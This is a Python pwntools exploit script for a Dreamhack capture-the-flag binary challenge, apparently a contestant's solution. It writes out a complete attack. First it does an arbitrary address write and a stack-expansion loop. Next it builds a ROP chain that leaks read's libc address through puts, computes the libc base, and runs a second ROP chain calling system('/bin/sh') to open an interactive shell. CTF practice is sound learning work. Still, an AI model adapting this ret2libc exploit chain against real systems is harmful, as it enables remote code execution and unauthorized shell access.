from pwn import *

context.log_level = 'info'

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# p = process('./prob')
p = remote('host3.dreamhack.games', 9116)
e = ELF('./prob')
libc = ELF('./libc.so.6')

p.sendafter(b'> ', b'Decision2Solve\x00\x00')

safe = e.symbols['safe']
main_func = e.symbols['main']
unsafe_func = e.symbols['unsafe_func']

# AAW (Arbitrary Address Write)
slog('safe', safe)
slog('main', main_func)
slog('unsafe_func', unsafe_func)

p.send(p64(safe))
p.send(p64(main_func)[:6])

# Stack frame expand (until 0x10000)
for i in range(0x400):
    print(f"Trial # {i}", end='\r', flush=True)
    p.sendlineafter(b'> ', b'1')

    p.sendafter(b'> ', b'A' * 16)

# Exploit
context.log_level = 'debug'
p.sendlineafter(b'> ', b'2')

puts_plt = e.plt['puts']
read_got = e.got['read']
read_plt = e.plt['read']

pop_rdi_rbp = 0x40129b
ret         = 0x40101a

# Stage 1
payload = b'B' * 0x28
payload += p64(pop_rdi_rbp) + p64(read_got) + p64(0)
payload += p64(puts_plt)
payload += p64(unsafe_func)
payload += b'\x00' * (0x10000 - len(payload))

p.send(payload)

# Stage 2

# Calculate libc base
read = u64(p.recvn(6) + b'\x00' * 2)
libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))

slog('read', read)
slog('libc base', libc_base)
slog('system', system)
slog('/bin/sh', binsh)

payload = b'C' * 0x28
payload += p64(pop_rdi_rbp) + p64(binsh) + p64(0)
payload += p64(ret) + p64(system)
payload += b'\x00' * (0x10000 - len(payload))

p.send(payload)

p.interactive()